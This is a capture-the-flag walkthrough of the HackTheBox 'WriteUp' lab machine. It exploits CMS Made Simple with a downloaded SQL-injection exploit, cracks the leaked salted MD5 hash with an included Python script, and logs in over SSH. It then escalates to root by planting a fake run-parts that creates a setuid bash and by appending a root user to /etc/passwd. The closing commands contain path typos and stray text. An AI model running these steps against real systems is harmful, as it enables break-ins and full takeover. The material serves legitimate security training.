## --------->> WriteUp <<-----------

(Attached file -> decryptor.py)

// We start with nmap scan

    $ nmap -sV -A -Pn 10.10.10.138 -p-
----

    Nmap scan report for 10.10.10.138
    Host is up (0.17s latency).
    Not shown: 65533 filtered ports
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
    | ssh-hostkey: 
    |   2048 dd:53:10:70:0b:d0:47:0a:e2:7e:4a:b6:42:98:23:c7 (RSA)
    |   256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA)
    |_  256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519)
    80/tcp open  http    Apache httpd 2.4.25 ((Debian))
    | http-robots.txt: 1 disallowed entry 
    |_/writeup/
    |_http-server-header: Apache/2.4.25 (Debian)
    |_http-title: Nothing here yet.
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    
// navigating to http://10.10.10.138/

![Image 1](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/WriteUp/1.png)

// When tried to search for any directories in http://10.10.10.138/ with gobuster and dirsearch

// I had Errors, what means this site is protected as written in the site

// So, i tried to approach other way and navigate http://10.10.10.138/robots.txt 

![Image 2](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/WriteUp/2.png)

// There is mention of another directory '/writeup/'

// Navigating to http://10.10.10.138/writeup/

// Its seems like some writeups for HTB

![Image 3](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/WriteUp/3.png)

// Nothing special in the directories inside

// But, somthing Strange that cougth my eye waz the strange COOKIE (usually PESSID and here CMSSESSID)

    CMSSESSID9d372ef93962:"1nreh2bl6g859iaq65c12iqjb1"

// Lets use Tool wappalyzer - CMS finder

// for download the tool first need npm installer

    $ apt install npm

// then install wappalyzer tool

    $ npm i -g wappalyzer

// Now lets scan the CMS

    $ wappalyzer http://10.10.10.138/writeup/ | jq
    
// found cms !

    cms made simple
    
// Search exploit db cms made simple 2019    

// found python exploit for CVE:2019-9053, lets try him

![Image 4](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/WriteUp/4.png)

// Download the explot

    $ wget https://www.exploit-db.com/download/46635

// Run the exploit (work ONLY with python2)

    $ python 46635 -u http://10.10.10.138/writeup/
-----

    [+] Salt for password found: 5a599ef579066807
    [+] Username found: jkr
    [+] Email found: jkr@writeup.htb
    [+] Password found: 62def4866937f08cc13bab43bb14e6f7


// we can decrypted the hash at https://hashtoolkit.com/generate-hash/?text=salt

![Image 5](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/WriteUp/5.png)


// Or, we could use python library 'hashlib' to help us with small script(the script file added)

    $ cat decryptor.py 
----

    import hashlib


    def crack_password():

        password = "62def4866937f08cc13bab43bb14e6f7"
        wordlist = "/usr/share/wordlists/rockyou.txt"
        salt = "5a599ef579066807"
        cracked = ''

        # open /usr/share/wordlists/rockyou.txt
        dictionary = open(wordlist)

        # Loop for compare hash to hash from rockyou.txt
        for line in dictionary.readlines():
        # drop down line to next passowrd
            line = line.replace("\n", "")
        # if "5a599ef579066807" + "somepassowrd" == "62def4866937f08cc13bab43bb14e6f7"
            if hashlib.md5(str(salt) + line).hexdigest() == password:
            # print cracked passowrd
                cracked += "\n[+] Password cracked: " + line
            # exit
                break
        print(cracked)


    crack_password()
    

!!! The script work only for that hash !!!

// run script (python2)

    $ python decryptor.py 
-----

    [+] Password cracked: raykayjay9



// Lets connect user jkr with ssh

    $ ssh jkr@10.10.10.138

// We have connection !

    jkr@10.10.10.138's password: 
    Linux writeup 4.9.0-8-amd64 x86_64 GNU/Linux

    The programs included with the Devuan GNU/Linux system are free software;
    the exact distribution terms for each program are described in the
    individual files in /usr/share/doc/*/copyright.

    Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
    permitted by applicable law.
    jkr@writeup:~$ id
    uid=1000(jkr) gid=1000(jkr) groups=1000(jkr),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),50(staff),103(netdev)

// and we got user flag !

    jkr@writeup:~$ cat user.txt 
    d4e493fd4.....................
    
### -----Privilleges Escalaltion----

// First we will run ![PSPY](https://github.com/DominicBreuker/pspy) tool to check our options

// For upload the tool on remote machine we will use python http server

    $ python3 -m http.server 1445
    Serving HTTP on 0.0.0.0 port 1445 (http://0.0.0.0:1445/) ...

// Download the tool with wget

    wget http://10.10.17.8:1445/pspy64 

// Give execute(+x) permissions

    jkr@writeup:/tmp/mytest$ chmod +x pspy64 

// And run the file

    jkr@writeup:/tmp/mytest$ ./pspy64 
    pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


         ██▓███    ██████  ██▓███ ▓██   ██▓
        ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
        ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
        ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
        ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
        ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
        ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
        ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                       ░           ░ ░     
                                   ░ ░    
       
     Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
    Draining file system events due to startup...
    done
    ........
    2021/08/02 14:53:50 CMD: UID=0    PID=10     | 
    2021/08/02 14:53:50 CMD: UID=0    PID=1      | init [2]   
    2021/08/02 14:54:01 CMD: UID=0    PID=2291   | /usr/sbin/CRON 
    2021/08/02 14:54:01 CMD: UID=0    PID=2292   | /usr/sbin/CRON 
    2021/08/02 14:54:01 CMD: UID=0    PID=2293   | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1 
    2021/08/02 14:55:01 CMD: UID=0    PID=2294   | /usr/sbin/CRON 
    2021/08/02 14:55:01 CMD: UID=0    PID=2295   | /usr/sbin/CRON 
    2021/08/02 14:55:01 CMD: UID=0    PID=2296   | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1 
    2021/08/02 14:55:59 CMD: UID=0    PID=2297   | sshd: [accepted]
    2021/08/02 14:56:00 CMD: UID=102  PID=2298   | sshd: [net]       
    2021/08/02 14:56:01 CMD: UID=0    PID=2299   | /usr/sbin/CRON 
    2021/08/02 14:56:01 CMD: UID=0    PID=2300   | /usr/sbin/CRON 
    2021/08/02 14:56:01 CMD: UID=0    PID=2301   | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1 


// We can see there is a proccess /root/bin/cleanup.pl running every minute

// When open another window and connect to jkr user with ssh i get logs in the pspy

    2021/08/02 14:56:17 CMD: UID=0    PID=2302   | sshd: jkr [priv]  
    2021/08/02 14:56:17 CMD: UID=0    PID=2303   | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new 
    2021/08/02 14:56:17 CMD: UID=0    PID=2304   | run-parts --lsbsysinit /etc/update-motd.d 
    2021/08/02 14:56:17 CMD: UID=0    PID=2305   | uname -rnsom 
    2021/08/02 14:56:17 CMD: UID=0    PID=2306   | sshd: jkr [priv]  
    2021/08/02 14:56:18 CMD: UID=1000 PID=2307   | sshd: jkr@pts/1   
    2021/08/02 14:56:18 CMD: UID=1000 PID=2308   | -bash 
    2021/08/02 14:56:18 CMD: UID=1000 PID=2309   | -bash 
    2021/08/02 14:56:18 CMD: UID=1000 PID=2310   | -bash 
    2021/08/02 14:56:18 CMD: UID=1000 PID=2311   | -bash 
    2021/08/02 14:56:51 CMD: UID=1000 PID=2312   | -bash 

// what we can see here is that when a user logs in, root runs sh, that run /usr/bin/env, that provide a path and runs 'run-parts' on the 'update-motd.d' folder

// lets test write permissions on /usr/local/bin/run-parts

echo -e '#!/bin/bash\n\ncp /bin/bash /bin/SomeXFile\nchmod u+s /bin/SomeXFile' > /usr/local/bin/run-parts; chmod +x /usr.local.bin/run-parts

#!/bin/bash
echo 'rooot:gDlPrjU6SWeKo:0:0:root:/root:/bin/bash' >> etc/passwd

raykayjay9

